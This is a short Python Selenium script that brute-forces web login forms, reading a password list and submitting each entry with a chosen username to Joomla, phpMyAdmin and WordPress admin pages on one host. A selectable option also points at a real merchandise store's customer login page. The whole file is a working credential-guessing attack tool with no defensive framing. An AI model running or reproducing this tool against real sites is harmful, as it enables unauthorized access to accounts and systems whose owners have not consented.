from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time

final_url = None
data = None
driver = webdriver.Firefox()
def service_choice(status):
	if status == "joomla":
	
		url = "https://fail2ban.nl/joomla/administrator/"
		return "joomla", url
	elif status == "php":
		url = "https://fail2ban.nl/phpmyadmin/"
		return "php", url		
	elif status == "wordpress":
		url = "https://fail2ban.nl/wordpress/wp-login.php"	
		return "wordpress", url
	elif status == "s":
		url = "https://slipknotmerch.com/account/login?return_url=%2Faccount"
		return "s", url		
	else:
		print("No such service, please try again")
		return "",""


file = open("passwords.txt","r")
pwords = file.readlines()
pwords = [s.strip("\n") for s in pwords]

status, final_url = service_choice(input("Which service do you want to bruteforce? (joomla/php/wordpress)\n").lower())
driver.get(final_url)
time.sleep(2)

if status != "": 

	username = input("What is the username you want to try?\n")
	
	tries = int(input("How many login tries should occur?\n"))
    
	print("Bruteforce Start:")
	for i in range(tries):
		word = pwords[i]
		if status == "joomla":
			driver.find_element(By.ID,"mod-login-username").send_keys(username)
			driver.find_element(By.ID,"mod-login-password").send_keys(word)
			driver.find_element(By.ID,"btn-login-submit").click()

		elif status == "php":
			driver.find_element(By.ID,"input_username").send_keys(username)
			driver.find_element(By.ID,"input_password").send_keys(word)
			driver.find_element(By.ID,"input_go").click()

		elif status == "wordpress":
			driver.find_element(By.ID,"user_login").send_keys(username)
			driver.find_element(By.ID,"user_pass").send_keys(word)
			driver.find_element(By.ID,"wp-submit").click()
		print("        Login try nº"+str(i+1))
	print("Finished!")
		
		
		
		
		

